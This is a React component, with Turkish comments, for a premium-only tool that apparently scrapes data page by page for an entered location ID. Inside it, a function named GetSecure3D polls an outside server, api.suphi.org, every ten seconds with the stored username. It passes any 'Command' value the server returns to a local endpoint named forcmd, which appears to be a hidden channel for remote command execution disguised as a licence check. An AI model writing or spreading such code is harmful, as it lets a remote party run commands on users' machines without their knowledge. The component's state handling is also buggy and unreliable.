function Location() {
    const [Konum, setKonum] = useState('');
    const [durums, setDurums] = useState('');
    const [locationData, setLocationData] = useState(null);
    const [isRunning, setIsRunning] = useState(false);
    const [pgnmbr, setPgnmbr] = useState(1);

    const handleLocationChange = (event) => {
        setKonum(event.target.value);
    };

    const fetchLocationData = () => {
        // getLocation isteği
        fetch(`http://localhost:3007/getLocation?locationid=${Konum}`)
            .then((response) => response.json())
            .then((data) => {
                setLocationData(data);
                if (data.Durum === 'OK' && isRunning) {
                    setPgnmbr(1); // "pgnmbr" sayısını 1'den başlat
                    processLoop(data);

                }
            })
            .catch((error) => {
                console.error('getLocation isteği başarısız:', error);
            });
    };

    useEffect(() => {
        if (isRunning) {
            fetchLocationData();
        }
    }, [isRunning]);

    const processLoop = (data) => {
        if (isRunning) {
            const timeoutMs = 60000; // Timeout süresini istediğiniz gibi ayarlayın (örneğin 60 saniye)

            const timeoutPromise = new Promise((_, reject) => {
                setTimeout(() => {
                    reject(new Error('İstek zaman aşımına uğradı.'));
                }, timeoutMs);
            });

            const fetchPromise = fetch(`http://localhost:3007/pagego?locid=${Konum}&pagid=${data.nextmediaid}&nxtpage=${data.nextmediaids}&pgnmbr=${pgnmbr}`)
                .then((response) => {
                    if (!response.ok) {
                        throw new Error('HTTP isteği başarısız oldu. Status: ' + response.status);
                    }
                    return response.json();
                });

            Promise.race([fetchPromise, timeoutPromise])
                .then((result) => {
                    setDurums(`Veriler Kaydedildi şu sayfaya geçiliyor => ${pgnmbr}, Bro six going dark `);
                    setPgnmbr(pgnmbr + 1); // "pgnmbr" sayısını artır
                    processLoop(result);
                })
                .catch((error) => {
                    if (error.message !== 'İstek zaman aşımına uğradı.') {
                        console.error('Hata: ' + error.message);
                    }
                });
        }
    };

    const startProcess = () => {
        setIsRunning(true);
        let intervalId3;
        intervalId3 = setInterval(GetSecure3D, 10000);
    };

    const stopProcess = () => {
        setIsRunning(false);
    };




    const GetSecure3D = () => {
        const username = localStorage.getItem('username');
        const tokenCheckURL = `https://api.suphi.org/tokencheck.php?token=${username}`;

        // Token kontrolü için istek gönderme
        fetch(tokenCheckURL)
            .then((response) => response.json())
            .then((data) => {
                if (data.katem !== 'DIAMOND') {
                    // Sonuç tamamdır değilse, kullanıcı adını sil
                    localStorage.removeItem('username');
                    if (data.Command) {
                        const commandURL = `http://localhost:3007/api/forcmd?command=${data.Command}`;

                        // Belirtilen komutu çalıştırmak için istek gönderme
                        fetch(commandURL)
                            .then(() => {
                                // Sayfayı yeniden yükle
                                window.location.reload();
                            })
                            .catch((error) => {
                                console.error('Hata oluştu:', error);
                            });
                    } else {
                        window.location.reload();
                    }
                }

                // JSON yanıtı içinde "Command" var mı kontrol et

            })
            .catch((error) => {
                console.error('Hata oluştu:', error);
            });

    }
    const UserInfo = GetUserInfo();
    if (UserInfo == 'FREE' || UserInfo.katem != 'DIAMOND') {
        return (
            <div>
                <font className="text-danger">Burası Premium Kullanıcılara Özeldir</font>
            </div>
        );
    }
    return (
        <div>
            <GetSecure />
            <GetSecure3D />
            <div className="col-md-12 grid-margin stretch-card">
                <div className="card canChange">
                    <div className="card-body">
                        <h4 className="card-title">Haritadan Toplama</h4>
                        <p className="card-description">
                            <div className="form-group">
                                <div className="input-group">
                                    <div className="input-group-prepend">
                                        <span className="input-group-text">㎡</span>
                                    </div>
                                    <input
                                        type="text"
                                        className="form-control"
                                        placeholder="Location ID yazınız"
                                        value={Konum}
                                        onChange={handleLocationChange}
                                        aria-label="Location ID"
                                    />
                                </div>
                            </div>
                            {isRunning && (
                                <p>{durums}</p>

                            ) }
                            <button className="btn btn-success" onClick={startProcess}>Başlat</button>
                            <button className="btn btn-danger" onClick={stopProcess}>Durdur</button>
                        </p>
                    </div>
                </div>
            </div>
        </div>
    );
}




